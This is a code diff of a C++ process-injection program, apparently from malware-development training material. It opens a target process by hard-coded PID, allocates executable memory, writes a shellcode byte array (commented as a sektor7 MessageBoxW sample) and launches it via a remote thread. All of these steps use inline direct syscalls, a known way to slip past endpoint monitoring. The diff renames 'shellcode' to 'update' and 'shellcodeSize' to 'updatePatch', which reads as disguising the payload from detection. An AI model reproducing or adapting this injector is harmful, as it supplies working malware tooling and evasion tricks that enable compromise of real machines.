@@ -103,7 +103,8 @@ int main(int argc, char* argv[])
     jm::init_syscalls_list();
 
     DWORD pid = 4580;
-    unsigned char shellcode[] = {
+    //sektor7 maldev msgboxw
+    unsigned char update[] = {
   0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00,
   0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
   0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
@@ -134,16 +135,16 @@ int main(int argc, char* argv[])
   0x4f, 0x3a, 0x20, 0x4d, 0x61, 0x6c, 0x44, 0x65, 0x76, 0x00 };
 
 
-SIZE_T shellcodeSize = sizeof(shellcode);
+SIZE_T updatePatch = sizeof(update);
 HANDLE hProcess;
 OBJECT_ATTRIBUTES objectAttributes = { sizeof(objectAttributes) };
 CLIENT_ID clientId = { (HANDLE)pid, NULL };
 INLINE_SYSCALL(NtOpenProcess)(&hProcess, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
 
 LPVOID baseAddress = NULL;
-INLINE_SYSCALL(NtAllocateVirtualMemory)(hProcess, &baseAddress, 0, &shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+INLINE_SYSCALL(NtAllocateVirtualMemory)(hProcess, &baseAddress, 0, &updatePatch, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
-INLINE_SYSCALL(NtWriteVirtualMemory)(hProcess, baseAddress, &shellcode, sizeof(shellcode), NULL);
+INLINE_SYSCALL(NtWriteVirtualMemory)(hProcess, baseAddress, &update, sizeof(update), NULL);
 
 HANDLE hThread;
 INLINE_SYSCALL(NtCreateThreadEx)(&hThread, GENERIC_EXECUTE, NULL, hProcess, baseAddress, NULL, FALSE, 0, 0, 0, NULL);
@@ -153,4 +154,3 @@ INLINE_SYSCALL(NtClose)(hThread);
 
 return 0;
 }
-
